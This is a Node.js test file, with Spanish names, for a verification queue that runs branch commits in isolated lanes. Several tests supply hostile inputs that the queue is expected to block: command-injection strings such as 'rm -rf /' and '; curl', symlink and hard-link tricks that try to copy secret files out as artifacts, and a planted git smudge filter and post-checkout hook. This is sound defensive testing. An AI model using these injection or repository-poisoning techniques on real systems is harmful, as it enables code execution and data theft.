    execFileSync("bash", [idleStop], { env: { PATH: `${bin}:${process.env.PATH}`, VERIFY_QUEUE_HOME: home, VERIFY_IDLE_STAMP: stamp } });
  } catch {
    // Sin apagar, el último `[ ... ] && ...` del script sale con 1.
  }
  return existsSync(join(dir, "stopped"));
}

test("la máquina se apaga a los 15 minutos sin uso, no antes", { skip: idleSkip }, (t) => {
  assert.equal(idleCheck(t, { idleFor: 16 * MINUTE }), true);
  assert.equal(idleCheck(t, { idleFor: 14 * MINUTE }), false);
  assert.equal(idleCheck(t, { noStamp: true }), false, "al arrancar empieza a contar");
});

test("una corrida y una subida en curso cuentan como uso", { skip: idleSkip }, (t) => {
  assert.equal(idleCheck(t, { files: { busy: 0 } }), false);
  assert.equal(idleCheck(t, { files: { "incoming/a.bundle": MINUTE } }), false);
  assert.equal(idleCheck(t, { files: { "incoming/a.bundle": 20 * MINUTE } }), true, "una subida muerta deja de contar");
});

test("una sesión cuenta hasta 2 horas y una que se cierra no cuenta", { skip: idleSkip }, (t) => {
  assert.equal(idleCheck(t, { sessions: [{ age: HOUR }] }), false);
  assert.equal(idleCheck(t, { sessions: [{ age: 3 * HOUR }] }), true);
  assert.equal(idleCheck(t, { sessions: [{ age: 3 * HOUR }, { age: MINUTE }] }), false);
  assert.equal(idleCheck(t, { sessions: [{ age: MINUTE, state: "closing" }] }), true);
});

test("una compilación cuenta hasta 2 horas", { skip: idleSkip }, (t) => {
  assert.equal(idleCheck(t, { processes: "60 /home/verify/.cargo/bin/rustc --edition 2021" }), false);
  assert.equal(idleCheck(t, { processes: "60 node scripts/verify.mjs" }), false);
  assert.equal(idleCheck(t, { processes: `${3 * HOUR} node scripts/verify.mjs` }), true);
  assert.equal(idleCheck(t, { processes: "60 node /opt/verify-queue/server.mjs" }), true);
});

const repos = JSON.parse(readFileSync(resolve(import.meta.dirname, "../../scripts/verify-queue/repos.json"), "utf8"));
const SHA = "a".repeat(40);

test("repos.json se carga y cada perfil corre con su propio usuario", () => {
  checkConfig(repos);
  for (const [repo, profile] of Object.entries(repos.repos)) assert.ok(profile.user, `${repo} sin usuario de corrida`);
  assert.notEqual(repos.repos.terminus.user, repos.repos["danil-engine"].user, "una rama de un repo no escribe el carril del otro");
});

test("los trabajos del motor se traducen a argv fijo y validan cada token", () => {
  const engine = repos.repos["danil-engine"];
  const values = { commit: SHA, base: SHA, jobs: 8 };
  assert.deepEqual(resolveCommand(engine, "verify", values).argv, ["python3", "scripts/verify", "--base", SHA]);
  assert.deepEqual(resolveCommand(engine, "verify --all", { ...values, base: null }).argv, ["python3", "scripts/verify", "--all"]);
  assert.deepEqual(resolveCommand(engine, "verify --only connector,cli-run", values).argv, ["python3", "scripts/verify", "--base", SHA, "--only", "connector,cli-run"]);
  assert.deepEqual(resolveCommand(engine, "e2e connector", values).argv, ["python3", "scripts/verify", "--no-lint", "--only", "connector"]);
  assert.deepEqual(resolveCommand(engine, "test --package seldon-runtime wire::round", values).argv, ["cargo", "test", "--locked", "-j", "8", "--package", "seldon-runtime", "--", "wire::round"]);
  assert.deepEqual(resolveCommand(engine, "test", values).argv, ["cargo", "test", "--locked", "-j", "8", "--"]);
  assert.equal(resolveCommand(engine, "rm -rf /", values), null);
  assert.equal(resolveCommand(repos.repos.terminus, "pnpm verify; curl x", values), null);
  const refused = [
    ["verify", { ...values, base: null }, /necesita base/],
    ["verify --all --all", values, /una sola vez/],
    ["verify  --all", values, /espacios/],
    ["verify --only", values, /no admite ese valor/],
    ["verify --only --all", values, /no admite ese valor/],
    ["verify --only a;b", values, /no admite ese valor/],
    ["test --nocapture", values, /no admite --nocapture/],
    ["test -Zunstable", values, /no admite -Zunstable/],
    ["test a b", values, /no admite «b»/],
    ["e2e", values, /necesita el nombre del E2E/],
    [`test ${Array(17).fill("--lib").join(" ")}`, values, /más de 16/],
  ];
  for (const [command, given, pattern] of refused) assert.throws(() => resolveCommand(engine, command, given), pattern, command);
});

test("repos.json mal formado no arranca la cola", () => {
  const jobs = { verify: { argv: ["x"] } };
  assert.throws(() => checkConfig({ repos: { r: { jobs: { verify: { argv: ["x", "--base", "{base}"] } } } } }), /base\.argv/);
  assert.throws(() => checkConfig({ repos: { r: { jobs, env: { HOME: "/x" } } } }), /env HOME/);
  assert.throws(() => checkConfig({ repos: { r: { jobs, env: { CARGO_TARGET_DIR: "/x" } } } }), /env CARGO_TARGET_DIR/);
  assert.throws(() => checkConfig({ repos: { r: { jobs, artifacts: ["../x"] } } }), /dentro del checkout/);
  assert.throws(() => checkConfig({ repos: { r: { jobs, commands: ["x"] } } }), /no los dos/);
});

/** Un perfil como el del motor: la cadena es un `chain.sh` del commit que escribe lo que el motor escribiría. */
const engineConfig = {
  repos: {
    engine: {
      target: "checkout",
      env: { HARNESS_BUILD_COMMIT: "{commit}" },
      fresh: ["target/verify"],
      artifacts: ["target/verify/*/summary.json", "target/verify/*/*.log"],
      receipt: { summary: "target/verify/*/summary.json", digests: { bin: "target/debug/bin" } },
      jobs: { verify: { argv: ["bash", "chain.sh", "{options}"], base: { argv: ["--base", "{base}"], unless: ["--all"] }, options: { "--all": null } } },
    },
  },
};

async function engineRun(t, queue, repo, dir, chain, extra = {}) {
  const sha = commit(repo, chain);
  const run = await queue.submit({ repo: "engine", commit: sha, command: "verify --all", bundle: bundle(repo, dir), ...extra });
  await queue.settled();
  return { sha, run: queue.readRun(run.id), id: run.id };
}

const summaryChain = (status = "PASS") => `
  set -e
  echo "args:$*"; echo "build:$HARNESS_BUILD_COMMIT"; echo "home:$HOME"; ls target/verify 2>/dev/null | sed 's/^/vieja:/' || true
  mkdir -p target/verify/r1 target/debug
  printf '{"results":[{"name":"build","status":"PASS","seconds":12.0},{"name":"durable-pending","status":"${status}","seconds":3}]}' > target/verify/r1/summary.json
  echo log > target/verify/r1/build.log
  printf binario > target/debug/bin`;

test("un checkout que la rama cambió por un enlace no deja copiar artefactos de otro sitio", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
  const { run, id } = await engineRun(t, queue, repo, dir, `
  set -e
  lane=$(dirname "$PWD")
  mkdir -p "$lane/decoy/target/verify/r1"; echo ajeno > "$lane/decoy/target/verify/r1/build.log"
  mv "$PWD" "$lane/real"; ln -s "$lane/decoy" "$lane/checkout"`);
  assert.equal(run.state, "failed");
  assert.match(readFileSync(queue.logPath(id), "utf8"), /apunta fuera de su sitio/);
  assert.equal(existsSync(join(home, "runs", id, "artifacts")), false);
});

test("el perfil del motor: target dentro del checkout, artefactos y recibo con checks", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
  const host = await serve(t, queue);
  const { sha, run, id } = await engineRun(t, queue, repo, dir, summaryChain("KNOWN"));
  assert.equal(run.state, "passed", readFileSync(queue.logPath(id), "utf8"));
  const log = readFileSync(queue.logPath(id), "utf8");
  assert.match(log, /args:--all/);
  assert.match(log, new RegExp(`build:${sha}`));
  assert.ok(existsSync(join(queue.lanePaths("engine").target, "debug/bin")), "la target del checkout sobrevive a git clean");
  assert.ok(existsSync(join(home, "runs", id, "artifacts/target/verify/r1/build.log")));

  const response = await fetch(`http://${host}/runs/${id}/receipt`);
  const bytes = Buffer.from(await response.arrayBuffer());
  assert.equal(response.headers.get("x-receipt-sha256"), createHash("sha256").update(bytes).digest("hex"));
  assert.equal(queue.readRun(id).receiptSha256, response.headers.get("x-receipt-sha256"));
  const receipt = JSON.parse(bytes);
  assert.equal(receipt.commit, sha);
  assert.equal(receipt.tree, git(repo, "rev-parse", `${sha}^{tree}`));
  assert.equal(receipt.state, "passed");
  assert.equal(receipt.exit_code, 0);
  assert.equal(receipt.wip, false);
  assert.equal(receipt.lane_previous_commit, null);
  assert.deepEqual(receipt.checks, [{ name: "build", status: "PASS", seconds: 12 }, { name: "durable-pending", status: "KNOWN", seconds: 3 }]);
  assert.deepEqual(receipt.known_failures, ["durable-pending"]);
  assert.equal(receipt.artifacts.bin, `sha256:${createHash("sha256").update("binario").digest("hex")}`);
  assert.equal("receipt_sha256" in receipt, false, "el hash va fuera del recibo");

  const second = await engineRun(t, queue, repo, dir, `${summaryChain()}\n# otra`);
  assert.doesNotMatch(readFileSync(queue.logPath(second.id), "utf8"), /vieja:/, "fresh borra target/verify antes de correr");
  assert.equal(queue.receiptBytes(second.id) && JSON.parse(queue.receiptBytes(second.id)).lane_previous_commit, sha);
});

test("checks es null si la corrida no deja exactamente un summary.json válido", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
  const none = await engineRun(t, queue, repo, dir, "exit 3");
  assert.equal(none.run.state, "failed");
  assert.equal(JSON.parse(queue.receiptBytes(none.id)).checks, null);
  assert.equal(JSON.parse(queue.receiptBytes(none.id)).exit_code, 3);
  const two = await engineRun(t, queue, repo, dir, `${summaryChain()}; mkdir -p target/verify/r2; cp target/verify/r1/summary.json target/verify/r2/`);
  assert.equal(JSON.parse(queue.receiptBytes(two.id)).checks, null);
  assert.match(readFileSync(queue.logPath(two.id), "utf8"), /2 archivos/);
  const bad = await engineRun(t, queue, repo, dir, summaryChain("GREEN"));
  assert.equal(JSON.parse(queue.receiptBytes(bad.id)).checks, null);
});

test("un artefacto enlazado, bajo un directorio enlazado o con enlace duro no se copia", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const secret = join(dir, "secret");
  mkdirSync(secret);
  writeFileSync(join(secret, "summary.json"), '{"results":[{"name":"robado","status":"PASS","seconds":1}]}');
  writeFileSync(join(secret, "x.log"), "secreto");
  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
  const linked = await engineRun(t, queue, repo, dir, `mkdir -p target/verify/r1; ln -s ${secret}/summary.json target/verify/r1/summary.json; ln ${secret}/x.log target/verify/r1/x.log`);
  assert.equal(existsSync(join(home, "runs", linked.id, "artifacts")), false);
  assert.equal(JSON.parse(queue.receiptBytes(linked.id)).checks, null);
  const parent = await engineRun(t, queue, repo, dir, `mkdir -p target; ln -s ${secret} target/verify-real; mkdir -p target/verify; ln -s ${secret} target/verify/r1`);
  assert.equal(existsSync(join(home, "runs", parent.id, "artifacts")), false);
  assert.equal(readFileSync(join(secret, "x.log"), "utf8"), "secreto");
});

test("un archivo sin cambios entre dos commits conserva su mtime: cargo no lo recompila", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
  writeFileSync(join(repo, "lib.rs"), "fn quieto() {}\n");
  await engineRun(t, queue, repo, dir, "true");
  const file = join(queue.lanePaths("engine").checkout, "lib.rs");
  const before = statSync(file).mtimeMs;
  await new Promise((done) => setTimeout(done, 1100));
  await engineRun(t, queue, repo, dir, "echo cambia");
  assert.equal(statSync(file).mtimeMs, before);
});

test("sin usuario de corrida la cola no corre la rama, salvo en pruebas", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config: engineConfig, diskPercent: () => 10 });
  const sha = commit(repo, "true");
  await assert.rejects(queue.submit({ repo: "engine", commit: sha, command: "verify --all", bundle: bundle(repo, dir) }), (error) => error.status === 503 && /usuario de corrida/.test(error.message));
});

test("base debe ser ancestro, y una foto wip dice el HEAD que tiene debajo", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
  const root = commit(repo, "true");
  await assert.rejects(queue.submit({ repo: "engine", commit: root, command: "verify --all", bundle: bundle(repo, dir), wip: true }), /exactamente un padre/);
  const head = commit(repo, "true");
  git(repo, "checkout", "-q", "--detach", root);
  const side = commit(repo, "echo lado");
  git(repo, "checkout", "-q", "-");
  await assert.rejects(queue.submit({ repo: "engine", commit: head, command: "verify", base: side, bundle: bundle(repo, dir) }), /no es ancestro/);
  const { run, id } = await engineRun(t, queue, repo, dir, 'echo "args:$*"', { wip: true });
  assert.equal(run.head, head);
  assert.equal(JSON.parse(queue.receiptBytes(id)).wip, true);
  const based = await queue.submit({ repo: "engine", commit: run.commit, command: "verify", base: root });
  await queue.settled();
  assert.match(readFileSync(queue.logPath(based.id), "utf8"), new RegExp(`args:--base ${root}`));
});

test("lo que una corrida deja en .git del carril no corre en la siguiente", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
  const ran = join(dir, "filtro-corrio");
  writeFileSync(join(repo, "x.txt"), "uno\n");
  const plant = `
    git config filter.evil.smudge "sh -c 'touch ${ran}; cat'"
    git config include.path /dev/null
    mkdir -p .git/info; echo "*.txt filter=evil" > .git/info/attributes
    printf '#!/bin/sh\ntouch ${ran}\n' > .git/hooks/post-checkout; chmod +x .git/hooks/post-checkout`;
  const first = await engineRun(t, queue, repo, dir, plant);
  assert.equal(first.run.state, "passed", readFileSync(queue.logPath(first.id), "utf8"));
  rmSync(ran, { force: true });
  writeFileSync(join(repo, "x.txt"), "dos\n");
  const second = await engineRun(t, queue, repo, dir, "git config --get filter.evil.smudge && exit 9; cat x.txt");
  assert.equal(second.run.state, "passed", readFileSync(queue.logPath(second.id), "utf8"));
  assert.equal(existsSync(ran), false, "ni el filtro ni el hook corrieron en el checkout de la segunda");
  assert.equal(readFileSync(join(queue.lanePaths("engine").checkout, "x.txt"), "utf8"), "dos\n");
});

test("un .git que la rama cambió por un archivo se rehace", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
  const first = await engineRun(t, queue, repo, dir, `rm -rf .git; echo "gitdir: ${dir}" > .git`);
  assert.equal(first.run.state, "passed");
  const second = await engineRun(t, queue, repo, dir, "echo sano");
  assert.equal(second.run.state, "passed", readFileSync(queue.logPath(second.id), "utf8"));
  assert.match(readFileSync(queue.logPath(second.id), "utf8"), /sano/);
});

test("con dos carriles corren dos a la vez, la tercera espera, y cada una recibe la mitad de los núcleos", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const trace = join(dir, "trace");
  const lanesConfig = { lanes: 2, repos: { engine: { ...engineConfig.repos.engine, fresh: [], receipt: undefined, artifacts: [], jobs: { verify: { argv: ["bash", "chain.sh", "{jobs}"], options: { "--all": null } } } } } };
  const queue = createQueue({ home, config: lanesConfig, sameUser: true, cpus: 8, diskPercent: () => 10 });
  const chain = (name) => `echo "inicio-${name} $1" >> ${trace}; echo "tmp $TMPDIR" >> ${trace}; sleep 0.6; echo "fin-${name}" >> ${trace}`;
  const ids = [];
  for (const name of ["a", "b", "c"]) {
    const sha = commit(repo, chain(name));
    ids.push((await queue.submit({ repo: "engine", commit: sha, command: "verify", bundle: bundle(repo, dir) })).id);
  }
  await queue.settled();
  const all = readFileSync(trace, "utf8").trim().split("\n");
  const lines = all.filter((line) => !line.startsWith("tmp "));
  assert.deepEqual(lines.slice(0, 2).sort(), ["inicio-a 4", "inicio-b 4"], "dos a la vez, con 8/2 núcleos cada una");
  assert.ok(lines.indexOf("inicio-c 4") > Math.min(lines.indexOf("fin-a"), lines.indexOf("fin-b")), "la tercera espera un carril libre");
  const runs = ids.map((id) => queue.readRun(id));
  assert.deepEqual(runs.map((run) => run.state), ["passed", "passed", "passed"]);
  assert.deepEqual(runs.slice(0, 2).map((run) => run.lane).sort(), [0, 1]);
  assert.equal(JSON.parse(queue.receiptBytes(ids[0])).lane, String(runs[0].lane));
  assert.equal(existsSync(join(home, "busy")), false);
  const tmps = new Set(all.filter((line) => line.startsWith("tmp ")));
  assert.equal(tmps.size, 2, "cada carril tiene su TMPDIR: los candados de /tmp no cruzan carriles");
});

test("un repo vuelve al carril libre donde ya está caliente", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const lanesConfig = { lanes: 3, repos: { engine: { ...engineConfig.repos.engine, fresh: [], receipt: undefined, artifacts: [] } } };
  const queue = createQueue({ home, config: lanesConfig, sameUser: true, diskPercent: () => 10 });
  const first = await engineRun(t, queue, repo, dir, "true");
  assert.equal(first.run.lane, 0);
  const second = await engineRun(t, queue, repo, dir, "echo otra");
  assert.equal(second.run.lane, 0, "el carril 0 ya tiene el checkout y la target");
  assert.throws(() => checkConfig({ lanes: 0, repos: {} }), /lanes/);
  assert.throws(() => checkConfig({ lanes: 9, repos: {} }), /lanes/);
});

test("--wip manda la foto del árbol sobre HEAD y el recibo lo dice", { skip }, async (t) => {
  const { repo, home } = workspace(t);
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
  const host = await serve(t, queue);
  const head = commit(repo, "echo comprometido");
  writeFileSync(join(repo, "chain.sh"), "echo sin-commit");
  writeFileSync(join(repo, "nuevo.txt"), "x");
  const { code, output } = await client(repo, host, ["--wip"]);
  assert.equal(code, 0, output);
  assert.match(output, /sin-commit/);
  assert.match(output, new RegExp(`foto wip sobre ${head.slice(0, 10)}`));
  const [run] = queue.allRuns();
  assert.equal(run.wip, true);
  assert.equal(run.head, head);
  assert.equal(JSON.parse(queue.receiptBytes(run.id)).wip, true);
  assert.equal(git(repo, "rev-parse", "HEAD"), head, "la foto no mueve HEAD");
  assert.match(git(repo, "status", "--porcelain"), /nuevo\.txt/, "ni toca el índice ni los archivos");
  assert.equal(git(repo, "for-each-ref", "refs/verify-remote/"), "");
});

test("--wip sin cambios manda HEAD tal cual", { skip }, async (t) => {
  const { repo, home } = workspace(t);
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
  const host = await serve(t, queue);
  const head = commit(repo, "echo limpio");
  const { code, output } = await client(repo, host, ["--wip"]);
  assert.equal(code, 0, output);
  const [run] = queue.allRuns();
  assert.equal(run.commit, head);
  assert.equal(run.wip, false);
  assert.equal((await client(repo, host, ["--wip", "--commit", head])).code, 2);
});

test("el git del carril lee un espejo de otro dueño: safe.directory llega al upload-pack del fetch local", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  // Con un remoto local git quita los `-c` del entorno de upload-pack; este git falso hace que todo
  // repo parezca de otro dueño cuando corre como git del carril, igual que verify-run frente al espejo.
  const bin = join(dir, "bin");
  mkdirSync(bin);
  const real = execFileSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).trim();
  writeFileSync(join(bin, "git"), `#!/bin/sh\n[ -n "$GIT_CONFIG_GLOBAL" ] && export GIT_TEST_ASSUME_DIFFERENT_OWNER=1\nexec ${real} "$@"\n`, { mode: 0o755 });
  const path = process.env.PATH;
  process.env.PATH = `${bin}:${path}`;
  t.after(() => {
    process.env.PATH = path;
  });
  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
  const { run, id } = await engineRun(t, queue, repo, dir, "echo ajeno");
  const log = readFileSync(queue.logPath(id), "utf8");
  assert.doesNotMatch(log, /dubious ownership/);
  assert.equal(run.state, "passed", log);
  assert.match(log, /ajeno/);
});

test("un commit con fecha vieja no se poda al llegar, aunque haya más de 20 nuevos", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
  writeFileSync(join(repo, "chain.sh"), "echo viejo");
  git(repo, "add", ".");
  execFileSync("git", ["commit", "-q", "-m", "viejo"], { cwd: repo, env: { ...gitEnv, GIT_COMMITTER_DATE: "2020-01-01T00:00:00Z", GIT_AUTHOR_DATE: "2020-01-01T00:00:00Z" } });
  const old = git(repo, "rev-parse", "HEAD");
  for (let i = 0; i < 21; i += 1) {
    const sha = commit(repo, `echo n${i}`);
    await queue.submit({ repo: "terminus", commit: sha, command: "pnpm verify", bundle: bundle(repo, dir) });
  }
  await queue.settled();
  git(repo, "update-ref", "refs/heads/viejo", old);
  git(repo, "update-ref", "refs/verify-remote/t", old);
  const file = join(dir, "old.bundle");
  git(repo, "bundle", "create", "-q", file, "refs/verify-remote/t");
  const run = await queue.submit({ repo: "terminus", commit: old, command: "pnpm verify", bundle: file });
  await queue.settled();
  assert.equal(queue.readRun(run.id).state, "passed", readFileSync(queue.logPath(run.id), "utf8"));
  assert.ok(queue.knownCommits("terminus").length <= 22);
});

test("un repo con tope de carriles no pasa de él y usa sus núcleos; los demás siguen", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const trace = join(dir, "trace");
  const engine = { ...engineConfig.repos.engine, lanes: 1, cpus: 4, fresh: [], receipt: undefined, artifacts: [], jobs: { verify: { argv: ["bash", "chain.sh", "{jobs}"], options: { "--all": null } } } };
  const budget = { lanes: 3, repos: { engine, terminus: config.repos.terminus } };
  const queue = createQueue({ home, config: budget, sameUser: true, cpus: 8, diskPercent: () => 10 });
  const chain = (name) => `echo "inicio-${name} $1" >> ${trace}; sleep 0.6; echo "fin-${name}" >> ${trace}`;
  for (const name of ["m1", "m2"]) {
    const sha = commit(repo, chain(name));
    await queue.submit({ repo: "engine", commit: sha, command: "verify", bundle: bundle(repo, dir) });
  }
  const app = commit(repo, `echo "inicio-app" >> ${trace}; sleep 0.3; echo "fin-app" >> ${trace}`);
  await queue.submit({ repo: "terminus", commit: app, command: "pnpm verify", bundle: bundle(repo, dir) });
  await queue.settled();
  const lines = readFileSync(trace, "utf8").trim().split("\n");
  assert.ok(lines.indexOf("inicio-m2 4") > lines.indexOf("fin-m1"), "el motor corre de a uno");
  assert.ok(lines.indexOf("inicio-app") < lines.indexOf("fin-m1"), "la app no espera al motor");
  assert.ok(lines.includes("inicio-m1 4"), "el motor recibe sus 4 núcleos, no 8/3");
  assert.throws(() => checkConfig({ lanes: 2, repos: { r: { ...engine, lanes: 3 } } }), /lanes/);
});

test("los carriles cuelgan de lanesRoot y origin/dev apunta a la base de la corrida", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const lanesRoot = join(dir, "vl");
  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10, lanesRoot });
  const root = commit(repo, "true");
  const sha = commit(repo, 'echo "home:$HOME tmp:$TMPDIR"; echo "dev:$(git rev-parse --verify -q refs/remotes/origin/dev)"');
  const based = await queue.submit({ repo: "engine", commit: sha, command: "verify", base: root, bundle: bundle(repo, dir) });
  await queue.settled();
  const log = readFileSync(queue.logPath(based.id), "utf8");
  assert.equal(queue.readRun(based.id).state, "passed", log);
  assert.ok(queue.lanePaths("engine").checkout.startsWith(lanesRoot));
  assert.match(log, new RegExp(`home:${lanesRoot}/0/engine/h tmp:${lanesRoot}/0/engine/t`));
  assert.match(log, new RegExp(`dev:${root}`));
  const all = await queue.submit({ repo: "engine", commit: sha, command: "verify --all" });
  await queue.settled();
  assert.match(readFileSync(queue.logPath(all.id), "utf8"), /dev:\n/, "sin base no queda un origin/dev de otra corrida");
});

test("una corrida del motor con más de 64 logs los copia todos", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
  const { id } = await engineRun(t, queue, repo, dir, "mkdir -p target/verify/r1; for i in $(seq 70); do echo $i > target/verify/r1/e$i.log; done");
  assert.equal(readdirSync(join(home, "runs", id, "artifacts/target/verify/r1")).length, 70);
});
